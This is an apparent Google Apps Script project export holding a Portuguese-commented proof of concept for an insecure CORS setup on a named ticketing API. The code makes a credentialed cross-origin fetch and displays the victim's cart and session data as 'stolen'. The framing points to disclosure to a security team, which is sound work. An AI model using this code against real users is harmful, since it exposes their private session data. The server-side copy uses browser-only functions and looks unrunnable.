{"files":[{"id":"c3c053c1-c810-4aa8-a76d-3da4c186dc06","name":"appsscript","type":"json","source":"{\n  \"timeZone\": \"America/Sao_Paulo\",\n  \"dependencies\": {\n  },\n  \"exceptionLogging\": \"STACKDRIVER\",\n  \"runtimeVersion\": \"V8\"\n}"},{"id":"8004df07-0e15-4468-a7da-8cf178edc437","name":"Untitled","type":"server_js","source":"// --- Início do Código da Prova de Conceito (PoC) ---\n\n// URL do endpoint da API que vamos testar.\n// Lembre-se de substituir o ID do carrinho e o ID da sessão pelos seus próprios.\nconst apiEndpoint \u003d \"https://api.ingresso.com/v1/carts/seu_cart_id/sessions/sua_session_id/products\";\n\n// Configuração da requisição.\n// A opção \"credentials: \u0027include\u0027\" é crucial. Ela garante que os cookies de autenticação do usuário\n// (que contêm a sua sessão) sejam enviados junto com a requisição,\n// simulando o comportamento de um atacante que quer roubar seus dados.\nconst requestOptions \u003d {\n    method: \u0027GET\u0027,\n    credentials: \u0027include\u0027 // Isso envia os cookies junto com a requisição.\n};\n\n// Fazendo a requisição para a API usando a função fetch().\nfetch(apiEndpoint, requestOptions)\n    .then(response \u003d\u003e {\n        // Esta parte do código é a chave da PoC.\n        // Se a requisição for bloqueada pelo CORS, o navegador vai gerar um erro\n        // e este bloco de código NUNCA será executado.\n        // Se a vulnerabilidade existir, a resposta do servidor será lida\n        // e este bloco será executado.\n\n        if (response.ok) {\n            // A requisição foi bem-sucedida, o que demonstra a falha de CORS.\n            // O atacante agora pode ler a resposta do servidor.\n            return response.json();\n        } else {\n            // O servidor respondeu, mas com um erro HTTP (ex: 404, 500).\n            // No entanto, a vulnerabilidade de CORS ainda existe, pois o navegador\n            // permitiu que o script recebesse essa resposta.\n            throw new Error(`A API retornou um erro: ${response.status} ${response.statusText}`);\n        }\n    })\n    .then(data \u003d\u003e {\n        // Aqui, o atacante conseguiu ler os dados da sua sessão.\n        // Esta é a prova final do impacto da vulnerabilidade.\n        console.log(\"-----------------------------------------\");\n        console.log(\"POC BEM-SUCEDIDA! CORS Inseguro Detectado.\");\n        console.log(\"O script malicioso conseguiu ler a resposta da API.\");\n        console.log(\"Dados que o atacante roubou:\");\n        console.log(data);\n        console.log(\"-----------------------------------------\");\n\n        // Use o \"alert\" para que o resultado seja visualmente óbvio para a equipe de segurança.\n        alert(\"POC BEM-SUCEDIDA! Verifique o console para os dados roubados.\");\n    })\n    .catch(error \u003d\u003e {\n        // Este bloco de código será executado se houver um erro de rede ou se a requisição\n        // for bloqueada pelo navegador (CORS seguro).\n        console.error(\"-----------------------------------------\");\n        console.error(\"Erro na requisição.\");\n        console.error(\"Isto pode significar que a falha de CORS foi corrigida ou que há outro problema.\");\n        console.error(\"Detalhes do erro:\", error);\n        console.error(\"-----------------------------------------\");\n    });\n\n// --- Fim do Código da Prova de Conceito (PoC) ---"},{"id":"f99a9939-ad13-4ea4-96f7-6eef4ffbd6aa","name":"Untitled 2","type":"html","source":"\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003cbody\u003e\n  \u003ch3\u003eTeste de CORS\u003c/h3\u003e\n  \u003cdiv id\u003d\"result\"\u003e\u003c/div\u003e\n  \u003cscript\u003e\n    const apiEndpoint \u003d \"https://api.ingresso.com/v1/carts/seu_cart_id/sessions/sua_session_id/products\";\n    const requestOptions \u003d { method: \u0027GET\u0027, credentials: \u0027include\u0027 };\n\n    fetch(apiEndpoint, requestOptions)\n      .then(response \u003d\u003e {\n        if (response.ok) return response.json();\n        throw new Error(`Erro: ${response.status}`);\n      })\n      .then(data \u003d\u003e {\n        document.getElementById(\"result\").innerHTML \u003d `\n          \u003cp style\u003d\"color: red;\"\u003ePOC BEM-SUCEDIDA!\u003c/p\u003e\n          \u003cpre\u003e${JSON.stringify(data, null, 2)}\u003c/pre\u003e\n        `;\n      })\n      .catch(error \u003d\u003e {\n        document.getElementById(\"result\").innerHTML \u003d `\n          \u003cp style\u003d\"color: green;\"\u003eFalha na POC (CORS seguro).\u003c/p\u003e\n          \u003cpre\u003e${error.message}\u003c/pre\u003e\n        `;\n      });\n  \u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e"}]}